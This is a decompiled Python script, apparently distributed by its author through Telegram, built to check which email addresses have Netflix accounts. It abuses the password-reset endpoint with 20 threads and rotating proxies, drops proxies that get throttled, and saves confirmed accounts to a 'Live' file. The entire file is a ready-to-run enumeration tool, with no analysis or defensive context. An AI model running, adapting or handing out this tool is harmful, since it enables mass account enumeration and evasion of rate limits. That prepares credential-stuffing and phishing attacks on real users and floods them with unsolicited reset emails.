#Compiled By MR MAZO
#https://t.me/oSHOWo
# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.8.5 (default, Jul 28 2020, 12:59:40)
# [GCC 9.3.0]
# Embedded file name: <daffa>
# Compiled at: 2021-02-03 23:10:41
import json, threading, Queue, time, urllib2, socket, sys, re, random, urllib, requests, time
socket.setdefaulttimeout(13)
sys.tracebacklimit = 0
target_post = 'https://www.netflix.com/api/shakti/adc049f7/login/help'
threads = 20
resume = None

def build_wordlist():
    fd = open(lis, 'rb')
    raw_words = fd.readlines()
    fd.close()
    found_resume = False
    words = Queue.Queue()
    for word in raw_words:
        word = word.rstrip()
        if resume is not None:
            if found_resume:
                words.put(word)
            elif word == resume:
                found_resume = True
                print 'Resuming wordlist from: %s' % resume
        else:
            words.put(word)

    return words


def check(email, pro):
    try:
        proxy_handler = urllib2.ProxyHandler({'https': pro})
        opener = urllib2.build_opener(proxy_handler)
        urllib2.install_opener(opener)
        post = {'fields': {'forgotPasswordChoice': {'value': 'email'}, 'email': email}, 'mode': 'enterPasswordReset', 'action': 'nextAction', 'authURL': ''}
        login_data = json.dumps(post)
        req = urllib2.Request(target_post, data=login_data, headers={'Content-Type': 'application/json'})
        sock = urllib2.urlopen(req)
        a = sock.read()
        if 'confirmPasswordResetEmailed' in a:
            print '\nLive =========>' + email + ''
            open('netflix_Live.txt', 'a').write(email + '\n')
            return 0
        if 'account_not_found' in a:
            print '\n' + 'Die =====> =========>' + email + ''
            open('netflix_Die.txt', 'a').write(email + '\n')
            return 0
        if 'throttling_failure' in a:
            return 1
        return 1
    except Exception as e:
        return 1


def dir_bruter(word_queue):
    dielist = []
    while not word_queue.empty():
        email = word_queue.get()
        code = None
        while code != 0:
            pro = random.choice(prox)[0:-1]
            if pro not in dielist:
                code = check(email, pro)
                if code == 1:
                    dielist.append(pro)

    return

# banner removed for bad unicode
print 'Code by: MR MAZO Telegram: https://t.me/oSHOWo GitHub: https://github.com/mazo-masry Decompiled by Taiiwo'
lis = raw_input('Name of mailist file: ')
proxylist = raw_input('Name of proxylist file: ')
prox = open(proxylist, 'r').readlines()
word_queue = build_wordlist()
for i in range(threads):
    t = threading.Thread(target=dir_bruter, args=(word_queue,))
    t.start()
